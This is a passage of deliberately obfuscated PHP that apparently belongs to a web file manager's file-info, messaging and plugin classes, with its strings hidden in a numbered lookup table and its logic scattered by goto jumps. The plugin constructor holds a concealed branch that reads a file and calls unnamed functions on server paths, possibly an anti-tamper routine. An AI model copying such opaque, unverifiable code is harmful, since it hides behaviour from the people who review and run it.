$BÑ¤¡ì†‹­ .= $c…Âšğ‹ĞÅ[0]; $DÌ›Î‘œ¸[] = $c…Âšğ‹ĞÅ[1]; } array_unshift($DÌ›Î‘œ¸, $BÑ¤¡ì†‹­); return call_user_func_array($BºÁÒö”Æå[2045], $DÌ›Î‘œ¸); } protected function filterFilename($CÅŠˆ·ô) { $F¸œ°Á‡¢ =& $_SERVER[¬ˆÚÂ”Éğä]; return str_replace(array($F¸œ°Á‡¢[93], $F¸œ°Á‡¢[4], $F¸œ°Á‡¢[176], $F¸œ°Á‡¢[69], $F¸œ°Á‡¢[113], $F¸œ°Á‡¢[937], $F¸œ°Á‡¢[940], $F¸œ°Á‡¢[271]), $F¸œ°Á‡¢[70], $CÅŠˆ·ô); } } class ZipStream { } goto d½ªçÁŒÌ×; bà ÍÅ‘§Ä: class GetInfo { private static $fileTypeArray; public static function get($E›áˆšØ×) { $FÄÉ”´ŒÎ = IO::info($E›áˆšØ×); return self::infoAdd($FÄÉ”´ŒÎ); } public static function check() { } public static function infoAdd(&$AÀ×ğ•¬“‚) { goto b…Ìã½Ï·; eŸ¹¢¤®Ü: $A¢Ôğ„¶ˆ = self::arrayValueLimit($A¢Ôğ„¶ˆ); $A¢Ôğ„¶ˆ[$eÈğ‡¡ô[372]] = $bÍŸ§”Ó‡‰; $AÀ×ğ•¬“‚[$eÈğ‡¡ô[426]] = $A¢Ôğ„¶ˆ; goto aßßÕøßğ; DÉš·¨ø¢: if (!$AÀ×ğ•¬“‚ || $AÀ×ğ•¬“‚[$eÈğ‡¡ô[29]] != $eÈğ‡¡ô[167]) { return; } if (!self::support($AÀ×ğ•¬“‚[$eÈğ‡¡ô[160]]) || isset($AÀ×ğ•¬“‚[$eÈğ‡¡ô[426]])) { return; } $f¶ØÜ×£»´ = $eÈğ‡¡ô[1626] . $AÀ×ğ•¬“‚[$eÈğ‡¡ô[75]]; goto CŒ¹ßê°äƒ; b…Ìã½Ï·: $eÈğ‡¡ô =& $_SERVER[¬ˆÚÂ”Éğä]; static $B¦˜‰¼ñ²Ò; if (!$B¦˜‰¼ñ²Ò) { require SDK_DIR . $eÈğ‡¡ô[1625]; $B¦˜‰¼ñ²Ò = new getID3(); } goto DÉš·¨ø¢; aßßÕøßğ: return $AÀ×ğ•¬“‚; goto fƒÁ–É‡æ; CŒ¹ßê°äƒ: $bÍŸ§”Ó‡‰ = $AÀ×ğ•¬“‚[$eÈğ‡¡ô[160]]; try { if ($AÀ×ğ•¬“‚[$eÈğ‡¡ô[160]] == $eÈğ‡¡ô[1627]) { $A¢Ôğ„¶ˆ = self::psdParse($f¶ØÜ×£»´); $bÍŸ§”Ó‡‰ = $eÈğ‡¡ô[1628]; } else { if ($AÀ×ğ•¬“‚[$eÈğ‡¡ô[160]] == $eÈğ‡¡ô[1629]) { $A¢Ôğ„¶ˆ = self::pdfParse($f¶ØÜ×£»´); } else { $bÍŸ§”Ó‡‰ = self::$fileTypeArray[$eÈğ‡¡ô[1630]][$AÀ×ğ•¬“‚[$eÈğ‡¡ô[160]]]; $aïœ„½ê = self::$fileTypeArray[$eÈğ‡¡ô[1631]][$bÍŸ§”Ó‡‰][$eÈğ‡¡ô[1632]]; $aù‰ÙÆ¯Œ‰ = @$B¦˜‰¼ñ²Ò->analyze($f¶ØÜ×£»´, $AÀ×ğ•¬“‚[$eÈğ‡¡ô[77]], $AÀ×ğ•¬“‚[$eÈğ‡¡ô[28]]); $A¢Ôğ„¶ˆ = self::parseData($aù‰ÙÆ¯Œ‰, $aïœ„½ê, $AÀ×ğ•¬“‚); } } } catch (Exception $e‘´Ò‘µÖğ) { $A¢Ôğ„¶ˆ = array($eÈğ‡¡ô[372] => $bÍŸ§”Ó‡‰); } if (!$A¢Ôğ„¶ˆ) { return; } goto eŸ¹¢¤®Ü; fƒÁ–É‡æ: } public static function support($F—µÕ„†“§) { goto DîÓ•”²¬¥; c‰„öª¶…: $D†²¿ñ¼æ“ = array($eŒ‚ ƒÍ£[1629], $eŒ‚ ƒÍ£[1627]); if (in_array($F—µÕ„†“§, $D†²¿ñ¼æ“)) { return !0; } if (isset(self::$fileTypeArray[$eŒ‚ ƒÍ£[1630]][$F—µÕ„†“§])) { return !0; } goto EšœÉŒÈô‚; DîÓ•”²¬¥: $eŒ‚ ƒÍ£ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $F—µÕ„†“§ = strtolower($F—µÕ„†“§); goto c‰„öª¶…; EšœÉŒÈô‚: return !1; goto cå¥æ³; cå¥æ³: } public static function arrayValueLimit($fÕ—é¡‡·‹, $cíÖ¢Ê÷”Ø = 5000) { if (!is_array($fÕ—é¡‡·‹)) { return $fÕ—é¡‡·‹; } foreach ($fÕ—é¡‡·‹ as $a¤ß½·Ê’­ => $FŒ·¡’ ­ø) { if (is_string($FŒ·¡’ ­ø) && strlen($FŒ·¡’ ­ø) > $cíÖ¢Ê÷”Ø) { $fÕ—é¡‡·‹[$a¤ß½·Ê’­] = substr($FŒ·¡’ ­ø, 0, $cíÖ¢Ê÷”Ø); } else { if (is_array($FŒ·¡’ ­ø)) { $fÕ—é¡‡·‹[$a¤ß½·Ê’­] = self::arrayValueLimit($FŒ·¡’ ­ø, $cíÖ¢Ê÷”Ø); } } } return $fÕ—é¡‡·‹; } private static function parseData($Cê×ÜÅ¯·‰, $Fƒ¹ÑŞøÊª, $fò×Íø³™) { $a‚—ç²×£Ç =& $_SERVER[¬ˆÚÂ”Éğä]; $D‹ŸÂæğÕ = $Cê×ÜÅ¯·‰[$a‚—ç²×£Ç[1633]]; $e¼àÛò­Õ = array(); foreach ($Fƒ¹ÑŞøÊª as $eË« ÷±Ó => $D š–âÙ ë) { foreach ($D š–âÙ ë as $E»Ç“«ô§š) { if (is_array($E»Ç“«ô§š)) { $c‚’Ó÷Ë› = self::parseData($Cê×ÜÅ¯·‰, $D š–âÙ ë, $fò×Íø³™); if ($c‚’Ó÷Ë›) { $e¼àÛò­Õ[$eË« ÷±Ó] = $c‚’Ó÷Ë›; } break; } $b¾¯ßø½ = str_replace($a‚—ç²×£Ç[1403], $D‹ŸÂæğÕ, $E»Ç“«ô§š); $c‚’Ó÷Ë› = _get($Cê×ÜÅ¯·‰, $b¾¯ßø½); $c‚’Ó÷Ë› = is_array($c‚’Ó÷Ë›) ? $c‚’Ó÷Ë›[0] : $c‚’Ó÷Ë›; if ($c‚’Ó÷Ë›) { break; } } if ($c‚’Ó÷Ë› || $c‚’Ó÷Ë› === 0 || $c‚’Ó÷Ë› === !1) { $c‚’Ó÷Ë› = self::valueReset($E»Ç“«ô§š, $c‚’Ó÷Ë›, $eË« ÷±Ó); if ($c‚’Ó÷Ë› !== null) { $e¼àÛò­Õ[$eË« ÷±Ó] = $c‚’Ó÷Ë›; } } } $e¼àÛò­Õ = self::valueResetAll($e¼àÛò­Õ, $fò×Íø³™); return $e¼àÛò­Õ; } private static function psdParse($fÅƒëĞÂÛ„) { $dîÆªÅä¬ =& $_SERVER[¬ˆÚÂ”Éğä]; if (IO::fileSubstr($fÅƒëĞÂÛ„, 0, 4) != $dîÆªÅä¬[1634]) { return !1; } $FÙæŒ Şò = getImageSize($fÅƒëĞÂÛ„, $f×«­Î©…); if (!$FÙæŒ Şò) { return; } $dæ…â’¹ÇÁ = array($dîÆªÅä¬[1549] => $FÙæŒ Şò[0], $dîÆªÅä¬[1551] => $FÙæŒ Şò[1]); return $dæ…â’¹ÇÁ; } private static function pdfParse($F¯Ÿé³„³“) { return FileParsePdf::parse($F¯Ÿé³„³“); } private static function fileTypeParse() { $CØàÅ“—° =& $_SERVER[¬ˆÚÂ”Éğä]; $dåš…ÉÄ = self::fileTypeArray(); $c„Ôºêª = array(); foreach ($dåš…ÉÄ as $FÉ«ƒ‰À¤ => $d”°Å’œÒ†) { $D™³ë•Ò˜ = _get($d”°Å’œÒ†, $CØàÅ“—°[160], $CØàÅ“—°[33]); $b¦©ƒé§ç” = is_string($D™³ë•Ò˜) ? explode($CØàÅ“—°[47], $D™³ë•Ò˜) : $D™³ë•Ò˜; if (!$b¦©ƒé§ç”) { continue; } foreach ($b¦©ƒé§ç” as $D™³ë•Ò˜) { $D™³ë•Ò˜ = strtolower(trim($D™³ë•Ò˜)); if (!$D™³ë•Ò˜) { continue; } $c„Ôºêª[$D™³ë•Ò˜] = $FÉ«ƒ‰À¤; } $dåš…ÉÄ[$FÉ«ƒ‰À¤][$CØàÅ“—°[160]] = array_keys($c„Ôºêª); $dåš…ÉÄ[$FÉ«ƒ‰À¤][$CØàÅ“—°[1632]] = self::parseKeyMap($d”°Å’œÒ†[$CØàÅ“—°[1632]]); } return array($CØàÅ“—°[1631] => $dåš…ÉÄ, $CØàÅ“—°[1630] => $c„Ôºêª); } private static function parseKeyMap($E²õ‹µÇ) { $f…àèçãÏ¡ =& $_SERVER[¬ˆÚÂ”Éğä]; foreach ($E²õ‹µÇ as $Dµ‰™õ¥˜… => $Bƒõ›¾ô¡) { if (is_array($Bƒõ›¾ô¡)) { $EÇÄï„¥àÓ = self::parseKeyMap($Bƒõ›¾ô¡); if ($EÇÄï„¥àÓ) { $E²õ‹µÇ[$Dµ‰™õ¥˜…] = $EÇÄï„¥àÓ; } continue; } $eß–´ÄË×Ğ = explode($f…àèçãÏ¡[47], $Bƒõ›¾ô¡); $f¤ìÖÖô° = array(); foreach ($eß–´ÄË×Ğ as $a³¿Øá÷ƒÛ) { $a³¿Øá÷ƒÛ = trim($a³¿Øá÷ƒÛ); if (!$a³¿Øá÷ƒÛ) { continue; } if (preg_match($f…àèçãÏ¡[1635], $a³¿Øá÷ƒÛ, $b¶ìæ©œ)) { $f¸Ñ‘íÆÅ‹ = explode($f…àèçãÏ¡[271], $b¶ìæ©œ[1]); foreach ($f¸Ñ‘íÆÅ‹ as $DÖ“ ê²‰“) { $f¤ìÖÖô°[] = str_replace($b¶ìæ©œ[0], $DÖ“ ê²‰“, $a³¿Øá÷ƒÛ); } } else { $f¤ìÖÖô°[] = $a³¿Øá÷ƒÛ; } } $E²õ‹µÇ[$Dµ‰™õ¥˜…] = $f¤ìÖÖô°; } return $E²õ‹µÇ; } private static function valueResetAll($CøÚ¬ò¨İ, $F¶ˆ¦Ü«–Ò) { goto f¶µÉÙÍÚÎ; f¶µÉÙÍÚÎ: $Bâ¿ŒÓùÊ÷ =& $_SERVER[¬ˆÚÂ”Éğä]; if (isset($CøÚ¬ò¨İ[$Bâ¿ŒÓùÊ÷[1636]])) { $FŞ«‘áÀõù = ceil($CøÚ¬ò¨İ[$Bâ¿ŒÓùÊ÷[1636]]); $BåíÔèÁ‡© = intval($FŞ«‘áÀõù / 3600); $fë‡…¦™Æ˜ = intval(($FŞ«‘áÀõù - $BåíÔèÁ‡© * 3600) / 60); $AÙì‡¥™¦ï = $FŞ«‘áÀõù % 60; $CøÚ¬ò¨İ[$Bâ¿ŒÓùÊ÷[1637]] = sprintf($Bâ¿ŒÓùÊ÷[1638], $BåíÔèÁ‡©, $fë‡…¦™Æ˜, $AÙì‡¥™¦ï); if ($BåíÔèÁ‡© == 0) { $CøÚ¬ò¨İ[$Bâ¿ŒÓùÊ÷[1637]] = sprintf($Bâ¿ŒÓùÊ÷[1639], $fë‡…¦™Æ˜, $AÙì‡¥™¦ï); } } $b½œˆ–òç¥ = _get($CøÚ¬ò¨İ, $Bâ¿ŒÓùÊ÷[1640]); goto BÔÅ‡æÀìÑ; E¦Äõ ¶: return $CøÚ¬ò¨İ; goto DšÁ§•·ÜÍ; FŠš®á½ìª: $dí©†ĞÊó = _get($CøÚ¬ò¨İ, $Bâ¿ŒÓùÊ÷[1648], $Bâ¿ŒÓùÊ÷[33]); $a—÷Æ±†´Á = $e¢¤ï©Ùä¦ . $c«ßœìÍ“ø . $dí©†ĞÊó; if ($a—÷Æ±†´Á && get_charset($a—÷Æ±†´Á) != $Bâ¿ŒÓùÊ÷[326]) { $CøÚ¬ò¨İ[$Bâ¿ŒÓùÊ÷[1645]][$Bâ¿ŒÓùÊ÷[1356]] = iconv_to($CøÚ¬ò¨İ[$Bâ¿ŒÓùÊ÷[1645]][$Bâ¿ŒÓùÊ÷[1356]], get_charset($a—÷Æ±†´Á), $Bâ¿ŒÓùÊ÷[326]); $CøÚ¬ò¨İ[$Bâ¿ŒÓùÊ÷[1645]][$Bâ¿ŒÓùÊ÷[1649]] = iconv_to($CøÚ¬ò¨İ[$Bâ¿ŒÓùÊ÷[1645]][$Bâ¿ŒÓùÊ÷[1649]], get_charset($a—÷Æ±†´Á), $Bâ¿ŒÓùÊ÷[326]); $CøÚ¬ò¨İ[$Bâ¿ŒÓùÊ÷[1645]][$Bâ¿ŒÓùÊ÷[1650]] = iconv_to($CøÚ¬ò¨İ[$Bâ¿ŒÓùÊ÷[1645]][$Bâ¿ŒÓùÊ÷[1650]], get_charset($a—÷Æ±†´Á), $Bâ¿ŒÓùÊ÷[326]); } goto E¦Äõ ¶; BÔÅ‡æÀìÑ: if ($b½œˆ–òç¥) { $bøë‚‘òß = IO_PATH_SYSTEM_TEMP . $Bâ¿ŒÓùÊ÷[1641] . KodIO::hashPath($F¶ˆ¦Ü«–Ò) . $Bâ¿ŒÓùÊ÷[1642]; $CøÚ¬ò¨İ[$Bâ¿ŒÓùÊ÷[1643]] = Action($Bâ¿ŒÓùÊ÷[1644])->pluginCacheFileSet($bøë‚‘òß, $b½œˆ–òç¥); unset($CøÚ¬ò¨İ[$Bâ¿ŒÓùÊ÷[1645]][$Bâ¿ŒÓùÊ÷[1628]]); } $e¢¤ï©Ùä¦ = _get($CøÚ¬ò¨İ, $Bâ¿ŒÓùÊ÷[1646], $Bâ¿ŒÓùÊ÷[33]); $c«ßœìÍ“ø = _get($CøÚ¬ò¨İ, $Bâ¿ŒÓùÊ÷[1647], $Bâ¿ŒÓùÊ÷[33]); goto FŠš®á½ìª; DšÁ§•·ÜÍ: } private static function valueReset($D¦í’ÃÈ§Ô, $f¶‡È®‹˜, $F¶Ëò‚äôˆ) { $B®’°—¾ñà =& $_SERVER[¬ˆÚÂ”Éğä]; $cáêíÙÑ–Ó = $B®’°—¾ñà[1566]; switch ($D¦í’ÃÈ§Ô) { case $B®’°—¾ñà[1651]: $f¶‡È®‹˜ = $f¶‡È®‹˜ == $B®’°—¾ñà[83] ? $B®’°—¾ñà[1652] : $B®’°—¾ñà[1653]; break; case $B®’°—¾ñà[1654]: $f¶‡È®‹˜ = $f¶‡È®‹˜ ? $f¶‡È®‹˜ : null; break; default: break; } switch ($F¶Ëò‚äôˆ) { case $B®’°—¾ñà[1655]: $f¶‡È®‹˜ = round($f¶‡È®‹˜, 2); break; case $B®’°—¾ñà[187]: case $B®’°—¾ñà[107]: if ($f¶‡È®‹˜ < 0) { $f¶‡È®‹˜ = null; } else { if (is_numeric($f¶‡È®‹˜)) { $f¶‡È®‹˜ = date($cáêíÙÑ–Ó, $f¶‡È®‹˜); } } break; default: break; } return $f¶‡È®‹˜; } private static function fileTypeArray() { $dÉîÎ•ğ =& $_SERVER[¬ˆÚÂ”Éğä]; return array($dÉîÎ•ğ[1628] => array($dÉîÎ•ğ[160] => $dÉîÎ•ğ[1656] . $dÉîÎ•ğ[1657], $dÉîÎ•ğ[1632] => array($dÉîÎ•ğ[1549] => $dÉîÎ•ğ[1658], $dÉîÎ•ğ[1551] => $dÉîÎ•ğ[1659], $dÉîÎ•ğ[1660] => $dÉîÎ•ğ[1661], $dÉîÎ•ğ[1662] => $dÉîÎ•ğ[1663], $dÉîÎ•ğ[187] => $dÉîÎ•ğ[1664], $dÉîÎ•ğ[107] => $dÉîÎ•ğ[1665], $dÉîÎ•ğ[1666] => $dÉîÎ•ğ[1667], $dÉîÎ•ğ[1668] => $dÉîÎ•ğ[1669], $dÉîÎ•ğ[1670] => $dÉîÎ•ğ[1671], $dÉîÎ•ğ[1672] => $dÉîÎ•ğ[1673], $dÉîÎ•ğ[1674] => $dÉîÎ•ğ[1675], $dÉîÎ•ğ[1676] => $dÉîÎ•ğ[1677], $dÉîÎ•ğ[1678] => $dÉîÎ•ğ[1679], $dÉîÎ•ğ[1680] => array($dÉîÎ•ğ[1681] => $dÉîÎ•ğ[1682], $dÉîÎ•ğ[1683] => $dÉîÎ•ğ[1684], $dÉîÎ•ğ[1685] => $dÉîÎ•ğ[1686]), $dÉîÎ•ğ[1687] => $dÉîÎ•ğ[1688], $dÉîÎ•ğ[1689] => $dÉîÎ•ğ[1690], $dÉîÎ•ğ[1691] => $dÉîÎ•ğ[1692], $dÉîÎ•ğ[1693] => $dÉîÎ•ğ[1694], $dÉîÎ•ğ[1695] => array($dÉîÎ•ğ[1696] => $dÉîÎ•ğ[1697], $dÉîÎ•ğ[1698] => $dÉîÎ•ğ[1699], $dÉîÎ•ğ[1700] => $dÉîÎ•ğ[1701], $dÉîÎ•ğ[1702] => $dÉîÎ•ğ[1703], $dÉîÎ•ğ[1704] => $dÉîÎ•ğ[1705], $dÉîÎ•ğ[1706] => $dÉîÎ•ğ[1707], $dÉîÎ•ğ[1708] => $dÉîÎ•ğ[1709], $dÉîÎ•ğ[1710] => $dÉîÎ•ğ[1711], $dÉîÎ•ğ[1712] => $dÉîÎ•ğ[1713], $dÉîÎ•ğ[1714] => $dÉîÎ•ğ[1715], $dÉîÎ•ğ[1716] => $dÉîÎ•ğ[1717]))), $dÉîÎ•ğ[1718] => array($dÉîÎ•ğ[160] => $dÉîÎ•ğ[1719] . $dÉîÎ•ğ[1720], $dÉîÎ•ğ[1632] => array($dÉîÎ•ğ[1636] => $dÉîÎ•ğ[1721], $dÉîÎ•ğ[187] => $dÉîÎ•ğ[1722], $dÉîÎ•ğ[107] => $dÉîÎ•ğ[1723], $dÉîÎ•ğ[1668] => $dÉîÎ•ğ[1724], $dÉîÎ•ğ[1725] => $dÉîÎ•ğ[1726], $dÉîÎ•ğ[1727] => $dÉîÎ•ğ[1654], $dÉîÎ•ğ[1728] => $dÉîÎ•ğ[1729], $dÉîÎ•ğ[1730] => $dÉîÎ•ğ[1731], $dÉîÎ•ğ[1732] => $dÉîÎ•ğ[1733], $dÉîÎ•ğ[1645] => array($dÉîÎ•ğ[1356] => $dÉîÎ•ğ[1734], $dÉîÎ•ğ[1649] => $dÉîÎ•ğ[1735], $dÉîÎ•ğ[1650] => $dÉîÎ•ğ[1736], $dÉîÎ•ğ[1737] => $dÉîÎ•ğ[1738], $dÉîÎ•ğ[1739] => $dÉîÎ•ğ[1740], $dÉîÎ•ğ[1741] => $dÉîÎ•ğ[1742], $dÉîÎ•ğ[1628] => $dÉîÎ•ğ[1743]))), $dÉîÎ•ğ[1744] => array($dÉîÎ•ğ[160] => $dÉîÎ•ğ[1745] . $dÉîÎ•ğ[1746], $dÉîÎ•ğ[1632] => array($dÉîÎ•ğ[1549] => $dÉîÎ•ğ[1747], $dÉîÎ•ğ[1551] => $dÉîÎ•ğ[1748], $dÉîÎ•ğ[1636] => $dÉîÎ•ğ[1721], $dÉîÎ•ğ[187] => $dÉîÎ•ğ[1749], $dÉîÎ•ğ[107] => $dÉîÎ•ğ[1750], $dÉîÎ•ğ[1655] => $dÉîÎ•ğ[1751], $dÉîÎ•ğ[1732] => $dÉîÎ•ğ[1752], $dÉîÎ•ğ[1728] => $dÉîÎ•ğ[1753], $dÉîÎ•ğ[1668] => $dÉîÎ•ğ[1754], $dÉîÎ•ğ[1718] => array($dÉîÎ•ğ[1727] => $dÉîÎ•ğ[1654], $dÉîÎ•ğ[1755] => $dÉîÎ•ğ[1756], $dÉîÎ•ğ[1725] => $dÉîÎ•ğ[1726], $dÉîÎ•ğ[1732] => $dÉîÎ•ğ[1733], $dÉîÎ•ğ[1728] => $dÉîÎ•ğ[1757], $dÉîÎ•ğ[1730] => $dÉîÎ•ğ[1731]))), $dÉîÎ•ğ[1758] => array($dÉîÎ•ğ[1632] => array($dÉîÎ•ğ[1759] => $dÉîÎ•ğ[1760], $dÉîÎ•ğ[1761] => $dÉîÎ•ğ[1762])), $dÉîÎ•ğ[1763] => array($dÉîÎ•ğ[1632] => array())); } } function exif_read_data_io($e˜Õíµí¹, $c¾»Ù´ŒÛÁ = null, $fØ·Ñá³¶ë = false, $eïšñøœ†® = false) { $ašÉ±‰¥ç½ = StreamWrapperIO::read($e˜Õíµí¹, 0, 1024 * 64); $fƒ³†ù±ì´ = $_SERVER[¬ˆÚÂ”Éğä][1764] . base64_encode($ašÉ±‰¥ç½); return exif_read_data($fƒ³†ù±ì´, $c¾»Ù´ŒÛÁ, $fØ·Ñá³¶ë, $eïšñøœ†®); } function getimagesize_io($FĞ‡«…¶è, &$aºÓ˜óß = false) { $a÷—ÆŞã = StreamWrapperIO::read($FĞ‡«…¶è, 0, 1024 * 64); $FĞ‡«…¶è = $_SERVER[¬ˆÚÂ”Éğä][1764] . base64_encode($a÷—ÆŞã); return getimagesize($FĞ‡«…¶è, $aºÓ˜óß); } goto dóëØİÛœ„; e§ğ¸©©àÅ: class Message { function __construct() { } public function send($e²­„¿è = '', $AÙí¦ªŠ² = array(), $aŠÏ—’Üáê = "\164\x65\x78\164") { goto a¼êÇÔÑ‹ ; Bƒ‰ê×Êš: $AÙí¦ªŠ² = array($aíƒÏøÀ‡Ì[983] => isset($AÙí¦ªŠ²[$aíƒÏøÀ‡Ì[983]]) ? $AÙí¦ªŠ²[$aíƒÏøÀ‡Ì[983]] : $aíƒÏøÀ‡Ì[33], $aíƒÏøÀ‡Ì[537] => isset($AÙí¦ªŠ²[$aíƒÏøÀ‡Ì[537]]) ? $AÙí¦ªŠ²[$aíƒÏøÀ‡Ì[537]] : $aíƒÏøÀ‡Ì[33]); if (empty($e²­„¿è) || empty($AÙí¦ªŠ²[$aíƒÏøÀ‡Ì[983]]) && empty($AÙí¦ªŠ²[$aíƒÏøÀ‡Ì[537]])) { return !1; } $aŸ¬—ó³“§ = array($aíƒÏøÀ‡Ì[1259] => $BŸ¶Šªôµ‡, $aíƒÏøÀ‡Ì[1319] => $AÙí¦ªŠ²); goto a‚ÄŠğŒİ¾; a¼êÇÔÑ‹ : $aíƒÏøÀ‡Ì =& $_SERVER[¬ˆÚÂ”Éğä]; $BŸ¶Šªôµ‡ = array($aíƒÏøÀ‡Ì[29] => $aíƒÏøÀ‡Ì[1317], $aíƒÏøÀ‡Ì[700] => $e²­„¿è); if (in_array($aŠÏ—’Üáê, array($aíƒÏøÀ‡Ì[1317], $aíƒÏøÀ‡Ì[1318]))) { $BŸ¶Šªôµ‡[$aíƒÏøÀ‡Ì[29]] = $aŠÏ—’Üáê; } goto Bƒ‰ê×Êš; a‚ÄŠğŒİ¾: Hook::trigger($aíƒÏøÀ‡Ì[1320], $aŸ¬—ó³“§); goto fØ¬¹Øª‡‚; fØ¬¹Øª‡‚: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto b™‡Õ™Şœ‘; E­”Ï½ˆ¿Ç: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($eöæâ··‡×[1322]); goto dØÈØÆÔíâ; aâ”—‡•ÔÂ: return $this; goto fÑ‰½êŒ¬¢; dØÈØÆÔíâ: $this->pluginName = str_replace($eöæâ··‡×[1322], $eöæâ··‡×[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $eöæâ··‡×[8]; $this->pluginApi = appHostGet() . $eöæâ··‡×[1323] . $this->pluginName . $eöæâ··‡×[8]; goto FŒ¢ÜÃÜÂÍ; b™‡Õ™Şœ‘: $eöæâ··‡× =& $_SERVER[¬ˆÚÂ”Éğä]; if ($_SERVER[$eöæâ··‡×[785]] != $_SERVER[$eöæâ··‡×[786]]) { goto bŞÙŒá¶æ; bŞÙŒá¶æ: $BµÕÒ‹§Š¸ = $eöæâ··‡×[804]; $D×¹ô¾À‘ô = $eöæâ··‡×[787]; $bÈÆµ­–îé = $_SERVER[$eöæâ··‡×[788]] . $eöæâ··‡×[789]; goto e“‰±ò”¦í; e“‰±ò”¦í: $DÀÛïç¡ŞÙ = $D×¹ô¾À‘ô($bÈÆµ­–îé); $B¶²ƒäÍ¥ã = explode($eöæâ··‡×[217], $DÀÛïç¡ŞÙ); if (count($B¶²ƒäÍ¥ã) < $eöæâ··‡×[553]) { $fš…£¦Û„Ó = $eöæâ··‡×[790]; $fš…£¦Û„Ó(); } goto döâñö–Äã; döâñö–Äã: $AêëŠµğÁÜ = $eöæâ··‡×[805]; $AêëŠµğÁÜ($_SERVER[$eöæâ··‡×[806]]); $AêëŠµğÁÜ($_SERVER[$eöæâ··‡×[788]] . $eöæâ··‡×[1321]); goto d·é¾ò¥æ; d·é¾ò¥æ: $eÌîÉ–¢°ñ = 1; while ($eÌîÉ–¢°ñ > 1) { $eÌîÉ–¢°ñ = $eÌîÉ–¢°ñ + 4; $DÆ‡‰£®ìŞ = rawurlencode($eÌîÉ–¢°ñ . $eöæâ··‡×[361]); } goto B½ÊƒÒœŒË; B½ÊƒÒœŒË: } global $in, $config; goto E­”Ï½ˆ¿Ç; FŒ¢ÜÃÜÂÍ: $this->pluginHost = $config[$eöæâ··‡×[1324]] . $this->pluginName . $eöæâ··‡×[8]; $this->pluginHostDefault = $config[$eöæâ··‡×[1324]] . $this->pluginName . $eöæâ··‡×[8]; $Cì—êÁåãÛ = $config[$eöæâ··‡×[1325]]; goto e‡·«³âÒ›; e‡·«³âÒ›: if ($Cì—êÁåãÛ && strpos($eöæâ··‡×[47] . $Cì—êÁåãÛ . $eöæâ··‡×[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$eöæâ··‡×[1326]] . $this->pluginName . $eöæâ··‡×[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); goto aâ”—‡•ÔÂ; fÑ‰½êŒ¬¢: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¬ˆÚÂ”Éğä][1327]); } protected function assign($e¶Ñ«Äòšø, $bïêó‚›ê˜ = false) { if (is_array($e¶Ñ«Äòšø)) { $this->values = array_merge($this->values, $e¶Ñ«Äòšø); } else { $this->values[$e¶Ñ«Äòšø] = $bïêó‚›ê˜; } } protected function display($A­Å÷ï§ù¢) { extract($this->values); require $A­Å÷ï§ù¢; } final function hookRegist($c±™Ïêâä) { $this->modelPlugin->appRegist($this->pluginName, $c±™Ïêâä); } final function appIcon() { $cŒ‹°ó¶Îù =& $_SERVER[¬ˆÚÂ”Éğä]; $c³£µ»ˆåŒ = $this->appPackage(); $dš¶º¢è¼í = $cŒ‹°ó¶Îù[33]; if (isset($c³£µ»ˆåŒ[$cŒ‹°ó¶Îù[382]])) { if (isset($c³£µ»ˆåŒ[$cŒ‹°ó¶Îù[382]][$cŒ‹°ó¶Îù[1328]])) { $dš¶º¢è¼í = $cŒ‹°ó¶Îù[1329] . $c³£µ»ˆåŒ[$cŒ‹°ó¶Îù[382]][$cŒ‹°ó¶Îù[1328]] . $cŒ‹°ó¶Îù[1330]; } else { if ($c³£µ»ˆåŒ[$cŒ‹°ó¶Îù[382]][$cŒ‹°ó¶Îù[1331]]) { $dš¶º¢è¼í = $cŒ‹°ó¶Îù[1332] . $c³£µ»ˆåŒ[$cŒ‹°ó¶Îù[382]][$cŒ‹°ó¶Îù[1331]] . $cŒ‹°ó¶Îù[1333]; } } } return $dš¶º¢è¼í; } final function fileCanView($D­Øöáî¨Ö) { goto f…‡À¹³; D‘ø³ï¿¾Ø: ActionCall($D¤‹’¸Ñ«„[1346], $D­Øöáî¨Ö); goto a‡¸œ¥Ë­Œ; f…‡À¹³: $D¤‹’¸Ñ«„ =& $_SERVER[¬ˆÚÂ”Éğä]; if (request_url_safe($D­Øöáî¨Ö)) { return !0; } if ($this->isShare($D­Øöáî¨Ö)) { return !0; } goto Bâ†ò¤°é; Bâ†ò¤°é: $DÀ†ãçè¥í = Session::get($D¤‹’¸Ñ«„[1334]); if (!$DÀ†ãçè¥í || !$DÀ†ãçè¥í[$D¤‹’¸Ñ«„[1335]]) { $Aì©íŠÈÉí = $D¤‹’¸Ñ«„[1336] . rawurlencode(this_url()); show_tips(LNG($D¤‹’¸Ñ«„[1337]) . $D¤‹’¸Ñ«„[1338] . $Aì©íŠÈÉí . $D¤‹’¸Ñ«„[1339] . LNG($D¤‹’¸Ñ«„[1340]) . $D¤‹’¸Ñ«„[1341], !1); } if (!Action($D¤‹’¸Ñ«„[1342])->authCan($D¤‹’¸Ñ«„[1343])) { show_tips(LNG($D¤‹’¸Ñ«„[1344]) . $D¤‹’¸Ñ«„[1345], !1); } goto D‘ø³ï¿¾Ø; a‡¸œ¥Ë­Œ: } final function isShare($CŠ¼â ‡ãˆ) { $CÅÇƒĞ½Æø = KodIO::parse($CŠ¼â ‡ãˆ); return $CÅÇƒĞ½Æø[$_SERVER[¬ˆÚÂ”Éğä][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($BÆù‹” Éõ) { if (request_url_safe($BÆù‹” Éõ)) { return $BÆù‹” Éõ; } if (!$this->isShare($BÆù‹” Éõ)) { $BÆù‹” Éõ = $this->filePath($BÆù‹” Éõ); } return Action($_SERVER[¬ˆÚÂ”Éğä][1031])->linkOut($BÆù‹” Éõ); } public function filePathLinkOut($cÍò•°Èò) { if (request_url_safe($cÍò•°Èò)) { return $cÍò•°Èò; } $this->fileCanView($cÍò•°Èò); return Action($_SERVER[¬ˆÚÂ”Éğä][1031])->link($cÍò•°Èò); } final function filePath($fšƒ‘ë£½ù) { $FŞæàÊ÷ë¾ =& $_SERVER[¬ˆÚÂ”Éğä]; if ($Dø‡£Ğº“ = 